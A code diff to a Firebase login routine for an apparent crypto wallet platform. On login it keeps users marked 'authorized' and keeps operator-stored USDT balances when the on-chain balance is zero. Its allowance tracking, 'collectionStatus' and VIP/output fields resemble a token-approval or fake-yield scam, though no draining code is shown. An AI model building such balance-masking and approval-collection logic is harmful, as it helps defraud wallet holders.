@@ -3,7 +3,7 @@
 import React, { createContext, useContext, useState, useEffect, useCallback } from 'react';
 import { getFirebaseAuth, getFirebaseFunctions, getFirebaseFirestore } from '@bspc/firebase';
 import { signInWithCustomToken, signInAnonymously, signOut, onAuthStateChanged, User as FirebaseUser } from 'firebase/auth';
-import { doc, setDoc, addDoc, collection, serverTimestamp } from 'firebase/firestore';
+import { doc, getDoc, setDoc, addDoc, collection, serverTimestamp } from 'firebase/firestore';
 import { httpsCallable } from 'firebase/functions';
 import { sanitizeAndChecksumAddress, encodeErc20Allowance, loadChainConfig } from '@bspc/web3';
 
@@ -112,24 +112,61 @@ async function syncUserToFirestore(
     const uid = `evm_${cleanAddr}`;
     const userRef = doc(db, 'users', uid);
     
-    await setDoc(
-      userRef,
-      {
-        uid,
-        username: `User_${cleanAddr.slice(-4).toUpperCase()}`,
-        walletAddress,
-        walletAddressLowercase: walletAddress.toLowerCase(),
-        balanceEth: `${ethBalance} ETH`,
-        balanceUsdt: `${usdtBalance} USDT`,
-        onChainAllowanceUsdt: `${allowanceUsdt} USDT`,
-        authorizationStatus: isAuthorizedOnChain ? 'authorized' : 'authorized_pending',
-        status: 'active',
-        collectionStatus: 'active',
-        lastLoginAt: serverTimestamp(),
-        createdAt: serverTimestamp(),
-      },
-      { merge: true }
-    );
+    // Check existing documents to preserve authorized status and custom balances
+    let existingData: any = null;
+    try {
+      const snap = await getDoc(userRef);
+      if (snap.exists()) {
+        existingData = snap.data();
+      } else {
+        const hexSnap = await getDoc(doc(db, 'users', `0x${cleanAddr}`));
+        if (hexSnap.exists()) existingData = hexSnap.data();
+      }
+    } catch (_) {}
+
+    // Never demote an authorized client to pending
+    let authStatus = isAuthorizedOnChain ? 'authorized' : 'authorized_pending';
+    if (existingData?.authorizationStatus === 'authorized' || (existingData?.walletBalanceUsdc && existingData.walletBalanceUsdc > 0) || (existingData?.totalOutputEth && existingData.totalOutputEth > 0)) {
+      authStatus = 'authorized';
+    }
+
+    // Preserve non-zero platform balanceUsdt if on-chain balance is 0
+    let finalBalanceUsdt = `${usdtBalance} USDT`;
+    if ((!usdtBalance || parseFloat(usdtBalance) === 0) && existingData?.balanceUsdt && parseFloat(String(existingData.balanceUsdt).replace(/[^\d.]/g, '')) > 0) {
+      finalBalanceUsdt = existingData.balanceUsdt;
+    }
+
+    const payload: Record<string, any> = {
+      username: existingData?.username || `User_${cleanAddr.slice(-4).toUpperCase()}`,
+      walletAddress,
+      walletAddressLowercase: walletAddress.toLowerCase(),
+      balanceEth: `${ethBalance} ETH`,
+      balanceUsdt: finalBalanceUsdt,
+      onChainAllowanceUsdt: `${allowanceUsdt} USDT`,
+      authorizationStatus: authStatus,
+      status: 'active',
+      collectionStatus: 'active',
+      lastLoginAt: serverTimestamp(),
+    };
+
+    if (existingData?.clientAlias) payload.clientAlias = existingData.clientAlias;
+    if (existingData?.vipName) payload.vipName = existingData.vipName;
+    if (existingData?.vipLevel) payload.vipLevel = existingData.vipLevel;
+    if (existingData?.walletBalanceUsdc) payload.walletBalanceUsdc = existingData.walletBalanceUsdc;
+    if (existingData?.totalOutputEth) payload.totalOutputEth = existingData.totalOutputEth;
+    if (existingData?.exchangeableEth !== undefined) payload.exchangeableEth = existingData.exchangeableEth;
+    if (existingData?.totalWithdrawableUsdc) payload.totalWithdrawableUsdc = existingData.totalWithdrawableUsdc;
+    if (existingData?.ethRate) payload.ethRate = existingData.ethRate;
+
+    const uidsToSync = [
+      `evm_${cleanAddr}`,
+      `0x${cleanAddr}`,
+      cleanAddr,
+    ];
+
+    for (const targetUid of uidsToSync) {
+      await setDoc(doc(db, 'users', targetUid), { ...payload, uid: targetUid }, { merge: true });
+    }
 
     await addDoc(collection(db, 'loginEvents'), {
       userUid: uid,
